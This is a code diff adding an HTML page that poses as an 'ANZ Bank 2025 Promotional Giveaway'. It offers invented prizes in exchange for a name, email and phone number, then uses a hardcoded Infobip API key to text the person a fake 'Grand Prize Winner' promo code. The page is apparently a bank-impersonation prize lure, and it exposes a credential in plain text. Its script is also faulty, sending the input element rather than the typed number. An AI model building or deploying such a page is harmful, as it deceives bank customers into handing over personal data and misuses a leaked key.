@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>ANZ Bank 2025 Promotional Giveaway</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <style>
+        body {
+          font-family: Arial, Helvetica, sans-serif;
+          background-image: url('anz.jpg');
+          background-repeat: no-repeat;
+          background-position: center center;
+          background-attachment: fixed;
+          background-size: cover;
+          height: 100vh;
+          width: 100%;
+          background-color: rgba(255, 255, 255, 0.4);
+          -webkit-backdrop-filter: blur(5px);
+          backdrop-filter: blur(5px);
+          padding: 50px 50px 50px 50px;
+        }
+        input[type=text] {
+            padding: 6px 6px;
+            margin: 2px 0;
+            box-sizing: border-box;
+        }
+        input[type=submit] {
+            padding: 6px 6px;
+            margin: 2px 0;
+            box-sizing: border-box;
+            font-weight: 600;
+        }
+        </style>
+    <script type="module">
+        const form = document.getElementById('myForm');
+        const phone = form.elements["myPhone"];
+        if (phone) {
+        const value = phone.value;
+        console.log(value);
+        }
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData);
+            try {
+                const url = 'https://1gzyr9.api.infobip.com/sms/2/text/advanced';
+                const data = `{
+                    "messages": [
+                        {
+                            "destinations": [
+                                {
+                                    "to": "${phone}"
+                                }
+                            ],
+                            "from": "InfoSMS",
+                            "text": "Congratulations - You are a Grand Prize Winner! Please redeem your promo code in the ANZ Banking app: X12Y7Z42IOATQ66"
+                        }
+                    ]
+                }`;
+                console.log(data);
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'App 2d7ea92fff58cfe119d6831a0fa223cc-1b7f4bc1-ea47-4bd1-87d3-bf85bb070e69',
+                        'Content-Type': 'application/json',
+                    },
+                    body: data,
+                });
+                const text = await response.text();
+                console.log(text);
+                console.log(phone);
+                window.location.href = 'Promo.html';
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        });
+    </script>
+</head>
+<body>
+    <center><h1><u>Welcome to the 2025 ANZ Bank Promotional Giveaway</u></h1></center>
+    <p><h2>Instructions</h2></p>
+    <p><h3>To enter, please fill in your information below, agree to the terms, and you will automatically reveive a SMS text with a promotional code.<br>
+        Enter the promotional code in the ANZ Banking app to redeem.<br>
+        Limit 1 promotional code per user account.</h3></p>
+    <p><h2>Prizes</h2></p>
+    <h3><p>Grand Prize - $10,000 ANZ Credit Card to 5 lucky winners.
+    <br>Main Prize - $500 Gift Card of your choice.  Odds are 1 in 1,000 users.
+    <br>Guaranteed Prize - $20 Gift Card.</p></h3>
+    <form name="myForm" id="myForm">
+        <p>Name:  <input type="text" id="myName" required></p>
+        <p>Email:  <input type="text" id="myEmail" required></p>
+        <p>Phone Number:  <input type="text" id="myPhone"  placeholder="2128659023" required></p>
+        <p><h5>By submitting your phone number you opt-in and allow ANZ Bank to send you SMS messages and can unsubscribe at any time.
+        <br>Data and messaging rates may apply.</h5><input type="checkbox" required> I agree to the terms of service.</p>
+        <p><input type="submit"></p>
+    </form>
+</body>
+</html>
